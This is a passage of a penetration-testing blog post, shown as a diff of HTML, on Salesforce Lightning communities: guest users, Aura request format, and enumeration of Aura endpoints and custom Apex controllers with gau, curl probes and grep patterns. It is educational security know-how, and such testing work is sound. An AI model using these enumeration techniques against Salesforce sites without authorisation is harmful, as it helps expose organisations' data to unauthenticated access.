+  <li><strong>Salesforce Community</strong>: these are sites that run on Salesforce’s Lightning framework and let customers and partners interface with Salesforce instances from outside an organization. Communities are public-facing and indexed by Google.</li>
+  <li><strong>Salesforce Lightning Component Framework</strong>: is a component-based framework for Salesforce app development. It includes the views (markup) and JS controllers on the client-side, then Apex controllers and databases on the server side. Default lightning components for example are ui, aura, and force. Those components are self-contained objects that a developer can assemble to create custom web pages.</li>
+  <li><strong>Aura components</strong> perform actions on Salesforce objects. Components have <strong>controllers</strong> that export different methods (or actions) to perform certain tasks. These are functions that interact in some ways with <strong>Objects</strong>. <strong>Params</strong> can also be passed to these functions. There are two types of controllers:
+    <ul>
+      <li><strong>Standard</strong> aura classes (<code class="language-plaintext highlighter-rouge">aura://</code>), pre-formatted functions to access Salesforce objects</li>
+      <li><strong>Custom</strong> apex classes (<code class="language-plaintext highlighter-rouge">apex://</code>), new functions developed from scratch by developers.</li>
+    </ul>
+  </li>
+  <li><strong>Objects</strong> <sup id="fnref:salesforce-objects"><a href="#fn:salesforce-objects" class="footnote" rel="footnote" role="doc-noteref">3</a></sup>, in Salesforce, can be considered like DB tables for storing data. They can be:
+    <ul>
+      <li><strong>Standard Objects</strong> <sup id="fnref:std-objects"><a href="#fn:std-objects" class="footnote" rel="footnote" role="doc-noteref">4</a></sup> (also labled <strong>Default Objects</strong>), and they are objects secured by SalesForce. A full list can be found <a href="https://github.com/reversebrain/salesforce_standard_objects/blob/main/objects.txt">here</a>.</li>
+      <li><strong>Custom Objects</strong> <sup id="fnref:custom-objects"><a href="#fn:custom-objects" class="footnote" rel="footnote" role="doc-noteref">5</a></sup>, identified by the <code class="language-plaintext highlighter-rouge">__c</code> in their name (like <code class="language-plaintext highlighter-rouge">level__c</code>). These are objects created manually by admins.</li>
+    </ul>
+  </li>
+  <li><strong>Fields</strong> are like DB table columns</li>
+  <li><strong>Records</strong> are like DB table rows</li>
+  <li><strong>Namespace</strong> - Think of it like a package, which groups related components together. Default namespaces are <code class="language-plaintext highlighter-rouge">aura</code>, <code class="language-plaintext highlighter-rouge">ui</code>, and <code class="language-plaintext highlighter-rouge">force</code>. Custom components that are created and added to a community will either use the namespace chosen by the Salesforce administrator, the namespace of a package or simply use the <code class="language-plaintext highlighter-rouge">c</code> namespace which refers to the default namespace.</li>
+</ul>
+
+<p><a href="/assets/img/Salesforce-PT/Salesforce-overview.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/Salesforce-overview.png" alt="" loading="lazy"></a>
+(<em>image taken from appomni.com</em>)</p>
+
+<h4 id="guest-user"><span class="me-2">Guest User</span><a href="#guest-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+<p>An <strong>unauthenticated user</strong> is called a <strong>Guest User</strong> in Salesforce. In recent versions he is not enabled by default, however, it’s not rare to find them enabled in the wild.</p>
+
+<p>You can usually easily recognise if the guest user is enabled because you will see many automatic requests to the <code class="language-plaintext highlighter-rouge">/aura</code> endpoint in the background (however that’s not always true).</p>
+
+<h4 id="salesforce-security-controls"><span class="me-2">Salesforce security controls</span><a href="#salesforce-security-controls" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+
+<blockquote class="warning">
+  <p>Permissions are set for objects, fields, and records <strong><em>separately</em></strong>!</p>
+</blockquote>
+
+<p>Objects have a very complex sharing model:</p>
+<ul>
+  <li>CRUDS</li>
+  <li>Groups</li>
+  <li>Sharing Rules</li>
+  <li>Owner [+Manual] [+Territory] [+Role]</li>
+  <li>etc.</li>
+</ul>
+
+<p>And <strong>custom objects are rarely configured with the correct OLS/FLS/RLS</strong>.</p>
+
+<p>Quoting “<a href="https://www.enumerated.ie/index/salesforce#how:~:text=the%20%E2%80%98force%E2%80%99%20namespace.-,How%20does%20Salesforce%20Lightning%20implement%20security%3F,-Prior%20to%20going"><em>How does Salesforce Lightning implement security?</em></a> “:</p>
+<blockquote>
+  <p>From an attacker’s perspective, the main security controls to be concerned with essentially boil down to the following (<em>open the links to the original article for a detailed explanation of what it is all about</em>):</p>
+  <ul>
+    <li><a href="https://www.enumerated.ie/index/salesforce#how:~:text=Level%20Security%20(RLS)-,Objects%20and%20OLS,-Interested%20in%20storing">Object Level Security (OLS)</a> - This is often referred to as CRUD within Salesforce documentation</li>
+    <li><a href="https://www.enumerated.ie/index/salesforce#how:~:text=Object%20%2D%3E%20Click%20%E2%80%98Edit%E2%80%99-,Fields%20and%20FLS,-FLS%20(field%2Dlevel">Field Level Security (FLS)</a></li>
+    <li><a href="https://www.enumerated.ie/index/salesforce#how:~:text=you%20scroll%20down.-,Records%20and%20RLS,-Lastly%2C%20are%20the">Record Level Security (RLS)</a></li>
+  </ul>
+</blockquote>
+
+<p>Also consider that in Lightning there is <strong>no real administrator</strong>, but there are <strong>specific groups created to perform privileged/restricted actions</strong>. This is to simplify authorizations, but this is where custom objects become a problem.</p>
+
+<h3 id="http-request-format-aura-components-and-apex"><span class="me-2">HTTP request format, Aura Components and APEX</span><a href="#http-request-format-aura-components-and-apex" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Aura components, Apex, and Salesforce form the backbone of Salesforce’s Lightning platform, empowering developers to build dynamic, interactive web applications. <strong>Aura components are reusable, modular building blocks</strong> that enable the creation of rich user interfaces, while <strong>Apex is Salesforce’s proprietary programming language</strong>, used to implement complex business logic on the server-side.</p>
+
+<p>Some useful resources for getting started poking around with aura components:</p>
+<ul>
+  <li><a href="https://developer.salesforce.com/docs/atlas.en-us.lightning.meta/lightning/intro_components.htm">Get Started with Aura Components</a>, developer.salesforce.com</li>
+  <li><a href="https://trailhead.salesforce.com/content/learn/projects/quickstart-lightning-components">Quick Start: Aura Components</a>, trailhead.salesforce.com</li>
+</ul>
+
+<p>The Apex classes that have methods that are denoted with <code class="language-plaintext highlighter-rouge">@AuraEnabled</code> are what interest us the most, as these methods <strong>can be called remotely through the Aura endpoint</strong>.
+Unfortunately, without access to the code itself, exploitation of apex class methods will always be done in blackbox (unless the class is open source).</p>
+
+<p>Salesforce standard HTTP requests to aura components <sup id="fnref:aura-comp"><a href="#fn:aura-comp" class="footnote" rel="footnote" role="doc-noteref">6</a></sup> look like the following:</p>
+
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/s/sfsites/aura?r=4&amp;ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=1</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">salesforce.example.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">... SNIPPED ...</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1324</span>
+<span class="na">X-Sfdc-Page-Scope-Id</span><span class="p">:</span> <span class="s">69b7ebbe-2e8b-4622-9738-06da97612d69</span>
+<span class="na">X-Sfdc-Request-Id</span><span class="p">:</span> <span class="s">22933900001b9f0ff3</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Sfdc-Page-Cache</span><span class="p">:</span> <span class="s">c29575b7054d1291</span>
+
+message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2291%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.communities.components.aura.components.forceCommunity.richText.RichTextController%2FACTION%24getParsedRichTextValue%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2FforceCommunity%3ArichText%22%2C%22params%22%3A%7B%22html%22%3A%22%3Cp%20style%3D%5C%22text-align%3A%20right%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1%7D%5C%22%20style%3D%5C%22width%3A%20368.115px%3B%20height%3A%2096.0625px%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1%7D%5C%22%20style%3D%5C%22width%3A%20377.013px%3B%20height%3A%2098.3875px%3B%5C%22%3E%3C%2Fp%3E%22%7D%2C%22version%22%3A%2261.0%22%2C%22storable%22%3Atrue%7D%5D%7D&amp;aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%2248jFr9jtMWnzXaDp1ibM3w%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&amp;aura.pageURI=%2Fs%2F%3Flanguage%3Den_US&amp;aura.token=null
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The HTTP body once decoded looks like this:</p>
+<div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre><span class="err">message=</span><span class="p">{</span><span class="w">
+  </span><span class="nl">"actions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"91;a"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"descriptor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"serviceComponent://ui.communities.components.aura.components.forceCommunity.richText.RichTextController/ACTION$getParsedRichTextValue"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"markup://forceCommunity:richText"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"params"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"html"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p style=</span><span class="se">\"</span><span class="s2">text-align: right;</span><span class="se">\"</span><span class="s2">&gt;&lt;img class=</span><span class="se">\"</span><span class="s2">sfdcCbImage</span><span class="se">\"</span><span class="s2"> alt=</span><span class="se">\"\"</span><span class="s2"> src=</span><span class="se">\"</span><span class="s2">{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1}</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">width: 368.115px; height: 96.0625px;</span><span class="se">\"</span><span class="s2">&gt;&lt;img class=</span><span class="se">\"</span><span class="s2">sfdcCbImage</span><span class="se">\"</span><span class="s2"> alt=</span><span class="se">\"\"</span><span class="s2"> src=</span><span class="se">\"</span><span class="s2">{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1}</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">width: 377.013px; height: 98.3875px;</span><span class="se">\"</span><span class="s2">&gt;&lt;/p&gt;"</span><span class="w">
+      </span><span class="p">},</span><span class="w">
+      </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"61.0"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"storable"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="err">&amp;aura.context=</span><span class="p">{</span><span class="w">
+  </span><span class="nl">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PROD"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"fwuid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"app"</span><span class="p">:</span><span class="w"> </span><span class="s2">"siteforce:communityApp"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"loaded"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"APPLICATION@markup://siteforce:communityApp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"48jFr9jtMWnzXaDp1ibM3w"</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"dn"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
+  </span><span class="nl">"globals"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
+  </span><span class="nl">"uad"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span><span class="p">}</span><span class="err">&amp;aura.pageURI=/s/?language=en_US</span><span class="w">
+</span><span class="err">&amp;aura.token=</span><span class="kc">null</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<blockquote class="tip">
+  <p>You can use the <a href="https://github.com/salesforce/lightning-burp">salesforce/lightning-burp</a> <a href="https://github.com/0xb120/cheatsheets_and_ctf-notes/blob/main/Dev%2C%20ICT%20%26%20Cybersec/Tools/Burpsuite.md#useful-extensions">burpsuite extension</a> plugin for better handling Lightning.</p>
+</blockquote>
+
+<p>The important fields to be considered in the HTTP body are:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">message</code>: contains a JSON object that encapsulates all necessary <strong>data for structuring the communication</strong> between the client-side Lightning components and Salesforce’s back-end.</li>
+  <li><code class="language-plaintext highlighter-rouge">aura.context</code>: provides essential metadata, state information, and security-related <strong>details that the server needs to process the request effectively</strong>. It encapsulates a variety of contextual data that enables the server to understand the environment in which the request is made.</li>
+  <li><code class="language-plaintext highlighter-rouge">aura.token</code>: the value will show whether or not you are authenticated. <code class="language-plaintext highlighter-rouge">undefined</code> or <code class="language-plaintext highlighter-rouge">null</code> values indicate you are a Guest User, otherwise a JWT token contains your user information.</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">message</code> contains <strong>actions</strong> (typically JavaScript functions or Apex controller methods) that need <strong>to be executed</strong>. Each action corresponds to a specific operation that the client is asking the server to perform, and is made up by:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">id</code>: random string used to identify multiple actions in the same request</li>
+  <li><code class="language-plaintext highlighter-rouge">descriptor</code>: A <strong>reference to the controller method or component action</strong> being invoked, in the form <code class="language-plaintext highlighter-rouge">namespace:component</code> (usually has the form <code class="language-plaintext highlighter-rouge">namespace://contoller-class/ACTION$method-to-invoke</code>).</li>
+  <li><code class="language-plaintext highlighter-rouge">callingDescriptor</code>: usually “UNKNOWN” since it is often ignored, but usually references the component or <strong>controller that initiated the action</strong>.</li>
+  <li><code class="language-plaintext highlighter-rouge">params</code>: <strong>parameters</strong> provided to the action.</li>
+</ul>
+
+<blockquote class="important">
+  <p>The <code class="language-plaintext highlighter-rouge">aura.context</code> and <code class="language-plaintext highlighter-rouge">aura.token</code> fields are <strong>not strictly tied to a single website</strong>, but <strong>can be reused</strong> (with minor adjustments) in any other Salesforce application, especially when the Guest User is enabled. This is very useful, especially for interacting with instances that support the guest user and have enabled the aura endpoint, but that do not send requests automatically (and therefore do not provide a starting “request template”).</p>
+</blockquote>
+
+<h2 id="salesforce-enumeration"><span class="me-2">Salesforce enumeration</span><a href="#salesforce-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="identify-the-targets"><span class="me-2">Identify the targets</span><a href="#identify-the-targets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Depending on the scope of the activity and the amount of time available, there are several ways to fingerprint Salesforce sites. Usually, a good way to start is to use <strong>Google dorks</strong> and <strong>search for common CNAMEs or common DNS</strong>. <sup id="fnref:salesforce-targets"><a href="#fn:salesforce-targets" class="footnote" rel="footnote" role="doc-noteref">7</a></sup></p>
+
+<p>Luckily in my case, I had already been provided with a DNS list of the client’s Salesforce sites (<em>but not the communities</em>), so I could start scanning and enumerating the sites directly without having to search for them first.</p>
+
+<h3 id="identify-the-aura-endpoint"><span class="me-2">Identify the aura endpoint</span><a href="#identify-the-aura-endpoint" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>As mentioned before, the <code class="language-plaintext highlighter-rouge">/aura</code> endpoint is an essential component for Salesforce sites and it is an important element when it comes to the threat model of applications.</p>
+
+<p>The endpoint is <strong>typically exposed on a standard path</strong>, however it may also be exposed on a path other than the root (usually happens when several communities are hosted on the same site, so each of them has its own aura endpoint), and is <strong>not always contacted automatically</strong> when navigating to a Salesforce site:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>## Standard endpoint
+/aura
+/sfsites/aura
+/s/sfsites/aura
+
+## Custom communities endpoint can start with other words, eg.
+/admin/s/sfsites/aura
+/customers/aura
+/foo/bar/sfsites/aura
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>You can search for such paths using some common <strong>nuclei templates</strong> <sup id="fnref:nuclei-template"><a href="#fn:nuclei-template" class="footnote" rel="footnote" role="doc-noteref">8</a></sup> or you can do it manually by sending an HTTP POST request and looking for the following patterns:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>## Search for these patterns in server response:
+"actions":[
+aura:clientOutOfSync
+aura:invalidSession
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>A good way to find the aura endpoint and the available communities without brute-forcing them is to use some passive recon tools like <em><strong>gau</strong></em> <sup id="fnref:gau"><a href="#fn:gau" class="footnote" rel="footnote" role="doc-noteref">9</a></sup> or <em><strong>waymore</strong></em> <sup id="fnref:waymore"><a href="#fn:waymore" class="footnote" rel="footnote" role="doc-noteref">10</a></sup> and search for the <code class="language-plaintext highlighter-rouge">/s/</code> pattern within the extracted URLs:</p>
+
+<div class="language-sh highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gau redacted.my.site.com        
+https://redacted.my.site.com/
+https://redacted.my.site.com/random-asd-1/s/article/What-steps-do-you-take-to-ensure-website-accessibility
+https://redacted.my.site.com/foo-bar-boom/s/mexico
+https://redacted.my.site.com/Beep/s/equipment-listing
+https://redacted.my.site.com/RAM/s/mexico
+https://redacted.my.site.com/robots.txt
+https://redacted.my.site.com/never-back-again/s/
+https://redacted.my.site.com/
+https://redacted.my.site.com/never-back-again/s/?language<span class="o">=</span>en_US
+https://redacted.my.site.com/ContactUs1337-pathUS/s/
+https://redacted.my.site.com/login
+https://redacted.my.site.com/Beep/s/
+https://redacted.my.site.com/login?locale<span class="o">=</span>us
+
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST https://redacted.my.site.com/Beep/s/sfsites/aura <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-d</span> <span class="s1">'foo=bar'</span>
+<span class="o">{</span><span class="s2">"event"</span>:<span class="o">{</span><span class="s2">"descriptor"</span>:<span class="s2">"markup://aura:invalidSession"</span>,<span class="s2">"attributes"</span>:<span class="o">{</span><span class="s2">"values"</span>:<span class="o">{}}</span>,<span class="s2">"eventDef"</span>:<span class="o">{</span><span class="s2">"descriptor"</span>:<span class="s2">"markup://aura:invalidSession"</span>,<span class="s2">"t"</span>:<span class="s2">"APPLICATION"</span>,<span class="s2">"xs"</span>:<span class="s2">"I"</span>,<span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"newToken"</span>:[<span class="s2">"newToken"</span>,<span class="s2">"aura://String"</span>,<span class="s2">"I"</span>,false]<span class="o">}}}</span>,<span class="s2">"exceptionMessage"</span>:<span class="s2">"Guest user access is not allowed"</span>,<span class="s2">"exceptionEvent"</span>:true<span class="o">}</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST https://redacted.my.site.com/random-asd-1/aura <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-d</span> <span class="s1">'foo=bar'</span>
+<span class="o">{</span><span class="s2">"event"</span>:<span class="o">{</span><span class="s2">"descriptor"</span>:<span class="s2">"markup://aura:invalidSession"</span>,<span class="s2">"attributes"</span>:<span class="o">{</span><span class="s2">"values"</span>:<span class="o">{}}</span>,<span class="s2">"eventDef"</span>:<span class="o">{</span><span class="s2">"descriptor"</span>:<span class="s2">"markup://aura:invalidSession"</span>,<span class="s2">"t"</span>:<span class="s2">"APPLICATION"</span>,<span class="s2">"xs"</span>:<span class="s2">"I"</span>,<span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"newToken"</span>:[<span class="s2">"newToken"</span>,<span class="s2">"aura://String"</span>,<span class="s2">"I"</span>,false]<span class="o">}}}</span>,<span class="s2">"exceptionMessage"</span>:<span class="s2">"Guest user access is not allowed"</span>,<span class="s2">"exceptionEvent"</span>:true<span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="identify-standard-and-custom-aura-components"><span class="me-2">Identify Standard and Custom aura components</span><a href="#identify-standard-and-custom-aura-components" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>A few standard JS files are loaded in <em>nearly</em> every Salesforce web application, containing details about standard classes, actions, and <em>occasionally</em> custom classes as well.</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">app.js</code></li>
+  <li><code class="language-plaintext highlighter-rouge">aura_prod.js</code></li>
+  <li><code class="language-plaintext highlighter-rouge">bootstrap.js</code></li>
+</ol>
+
+<p><strong>Grep</strong> for the below pattern in the <strong>responses</strong> of these JS files to identify the various classes and controllers made available by the site:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">componentService.initControllerDefs([{</code></li>
+</ul>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-app-js.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-app-js.png" alt="" loading="lazy"></a></p>
+
+<p>Custom classes sometimes are listed in those JS files too, but it’s most common to find them in HTTP requests and responses as you browse the application.</p>
+
+<p>You can recognize custom classes from standard ones because they start with <code class="language-plaintext highlighter-rouge">apex://</code> instead of <code class="language-plaintext highlighter-rouge">aura://</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>// STANDARD class:
+aura://RecordUiController/ACTION$getObjectInfo
+
+// CUSTOM class:
+apex://New_Sales_Controller/ACTION$getSalesData
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>You can easily search for them by grepping the full HTTP history and looking for the following keywords:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">compound://</code> in <strong>server responses</strong> (most of the time you can recognize easily the request because the <code class="language-plaintext highlighter-rouge">message</code> parameter is passed inside the query string instead of a POST body):
+<a href="/assets/img/Salesforce-PT/Salesforce-aura-compound.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/Salesforce-aura-compound.png" alt="" loading="lazy"></a></li>
+  <li><code class="language-plaintext highlighter-rouge">apex%3a%2f%2f</code> in <strong>HTTP requests</strong>:
+<a href="/assets/img/Salesforce-PT/Salesforce-apex-requests.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/Salesforce-apex-requests.png" alt="" loading="lazy"></a></li>
+</ul>
+
+<p>Within the various responses, you should obtain some results similar to the following snippet:</p>
+<div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre><span class="nl">"componentDef"</span><span class="p">:{</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"markup://c:CA_CommunityUtil"</span><span class="p">}</span><span class="err">,</span><span class="w">
+</span><span class="err">...</span><span class="w"> </span><span class="err">snip</span><span class="w"> </span><span class="err">...</span><span class="w">
+</span><span class="p">{</span><span class="w">
+</span><span class="nl">"xs"</span><span class="p">:</span><span class="s2">"P"</span><span class="p">,</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"markup://c:CA_CommunityUtil"</span><span class="p">,</span><span class="w">
+</span><span class="nl">"rl"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"st"</span><span class="p">:{</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"css://c.CA_CommunityUtil"</span><span class="p">,</span><span class="w">
+</span><span class="nl">"co"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
+</span><span class="nl">"cl"</span><span class="p">:</span><span class="s2">"cCA_CommunityUtil"</span><span class="p">},</span><span class="w">
+</span><span class="nl">"cd"</span><span class="p">:{</span><span class="w">
+  </span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"compound://c.CA_CommunityUtil"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"ac"</span><span class="p">:[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"n"</span><span class="p">:</span><span class="s2">"getCurrentCommunityContextInfos"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"apex://CommunityUtil/ACTION$getCurrentCommunityContextInfos"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"at"</span><span class="p">:</span><span class="s2">"SERVER"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"rt"</span><span class="p">:</span><span class="s2">"apex://Map&lt;String,ANY&gt;"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"pa"</span><span class="p">:[]</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"n"</span><span class="p">:</span><span class="s2">"getCurrentCommunityUrl"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"apex://CommunityUtil/ACTION$getCurrentCommunityUrl"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"at"</span><span class="p">:</span><span class="s2">"SERVER"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"rt"</span><span class="p">:</span><span class="s2">"apex://String"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"pa"</span><span class="p">:[]</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<p>The important values to note here are:</p>
+<ul>
+  <li>The <code class="language-plaintext highlighter-rouge">descriptor</code> value that exists in <code class="language-plaintext highlighter-rouge">componentDefs</code> : This can be used for <strong>retrieving the full definition</strong>, although not required at the moment (<em>more about this later</em>). The descriptor format is made up of <code class="language-plaintext highlighter-rouge">namespace:component</code>.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">descriptor</code> value inside the <code class="language-plaintext highlighter-rouge">ac</code> field, defining the <strong>actual controller</strong> and <strong>action</strong>.</li>
+  <li><code class="language-plaintext highlighter-rouge">rt</code>: The <strong>return value type</strong>.</li>
+  <li><code class="language-plaintext highlighter-rouge">pa</code>: <strong>Parameters</strong> that are passed to the apex class method, and their type.</li>
+</ul>
+
+<blockquote class="tip">
